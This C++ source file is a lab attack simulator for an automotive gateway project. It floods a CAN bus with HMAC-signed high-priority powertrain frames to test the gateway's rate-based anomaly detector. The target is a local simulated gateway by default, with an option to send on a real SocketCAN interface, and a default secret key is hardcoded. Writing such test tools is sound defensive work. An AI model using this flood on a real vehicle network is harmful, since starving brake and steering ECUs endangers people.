#include "autoshieldx/can/can_frame.hpp"
#include "autoshieldx/can/can_channel.hpp"
#include "autoshieldx/security/crypto_hmac.hpp"
#include <iostream>
#include <thread>
#include <chrono>

/**
 * ============================================================================
 * CONTROLLED LABORATORY ATTACK SIMULATOR: ATTACK 3 (CAN DoS / FLOODING)
 * ============================================================================
 * FOR LOCAL LAB SIMULATION ONLY.
 * NEVER USE AGAINST REAL VEHICLES OR PRODUCTION NETWORKS.
 *
 * Description:
 * In automotive CAN networks, bus arbitration is determined by CAN ID priority
 * (lower binary value = dominant bits = highest arbitration priority).
 * An attacker who floods high-priority frames (e.g., 0x000 or 0x100) at extreme
 * frequency starves all lower-priority ECUs (brakes, steering, ADAS) and
 * exhausts gateway CPU processing.
 *
 * Expected Gateway Response:
 * - Stage 4 (ML Behavioral Anomaly Detection):
 *   Detects message frequency exceeding baseline threshold (> 80 Hz),
 *   calculates high anomaly score, and drops flood frames.
 * ============================================================================
 */

int main(int argc, char* argv[]) {
    std::cout << "============================================================\n";
    std::cout << "  AutoShieldX - Attack 3: CAN DoS / Flooding Simulator       \n";
    std::cout << "  TARGET: Local Simulated Gateway (127.0.0.1:15000)          \n";
    std::cout << "  WARNING: Local Laboratory Simulation Only                 \n";
    std::cout << "============================================================\n";

    std::string secret = "4175746f536869656c64585f5365637265745f4b65795f32303236214155544f";
    std::string gateway_ip = "127.0.0.1";
    int gateway_port = 15000;
    int sender_port = 15013;
    int burst_count = 150;
    int sleep_ms = 3; // ~333 Hz burst rate
    std::string can_mode = "simulation";
    std::string can_iface = "can0";

    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "--socketcan" || arg == "can0" || arg == "--can0") {
            can_mode = "socketcan";
            if (arg != "--socketcan" && arg != "--can0") can_iface = arg;
        } else if (arg == "--simulation") {
            can_mode = "simulation";
        } else if (arg.rfind("--iface=", 0) == 0) {
            can_iface = arg.substr(8);
        } else if (arg == "--iface" && i + 1 < argc) {
            can_iface = argv[++i];
        } else if (arg.rfind("--secret=", 0) == 0) {
            secret = arg.substr(9);
        } else if (arg == "--secret" && i + 1 < argc) {
            secret = argv[++i];
        } else if (arg.rfind("--count=", 0) == 0) {
            burst_count = std::stoi(arg.substr(8));
        } else if (std::isdigit(static_cast<unsigned char>(arg[0])) && i == 1) {
            gateway_port = std::stoi(arg);
        }
    }

    std::vector<uint8_t> secret_bytes = autoshieldx::HmacSha256::parseKey(secret);

    std::shared_ptr<autoshieldx::ICanChannel> channel;
    if (can_mode == "socketcan") {
        channel = std::make_shared<autoshieldx::SocketCanChannel>(can_iface);
    } else {
        channel = std::make_shared<autoshieldx::SimulatedCanChannel>("127.0.0.1", sender_port, gateway_ip, gateway_port);
    }

    if (!channel->init()) {
        std::cerr << "[Attack 3] Error: Failed to open CAN channel (" << channel->getChannelType() << ").\n";
        return 1;
    }

    std::cout << "[Attack 3] Channel active (" << channel->getChannelType() << "). Launching high-frequency DoS flood ("
              << burst_count << " packets at ~300 Hz)...\n";

    uint32_t start_seq = 5000;
    for (int i = 0; i < burst_count; ++i) {
        autoshieldx::SecureCanMessage flood_msg;
        flood_msg.can_id = 0x100; // Flooding Powertrain CAN ID
        flood_msg.sequence_number = start_seq + i;
        flood_msg.timestamp_us = autoshieldx::getCurrentTimestampMicros();
        flood_msg.telemetry.speed_kmh = 80.0;
        flood_msg.telemetry.rpm = 3000.0;
        flood_msg.telemetry.temperature_c = 85.0;
        flood_msg.payload = autoshieldx::CanPayloadCodec::encodePowertrain(80.0, 3000.0, 35.0, 85.0, flood_msg.sequence_number);

        auto canon = autoshieldx::HmacSha256::buildCanonicalBuffer(
            flood_msg.can_id, flood_msg.sequence_number, flood_msg.payload);
        flood_msg.hmac_tag = autoshieldx::HmacSha256::computeHex(secret_bytes, canon);

        channel->send(flood_msg);

        if ((i + 1) % 25 == 0) {
            std::cout << "  Sent burst #" << (i + 1) << " frames...\n";
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(sleep_ms));
    }

    std::cout << "\n[Attack 3] DoS flooding burst finished.\n";
    std::cout << "Verify Gateway Console/Logs: Rate threshold violation detected by ML Anomaly Engine.\n";
    channel->close();
    return 0;
}
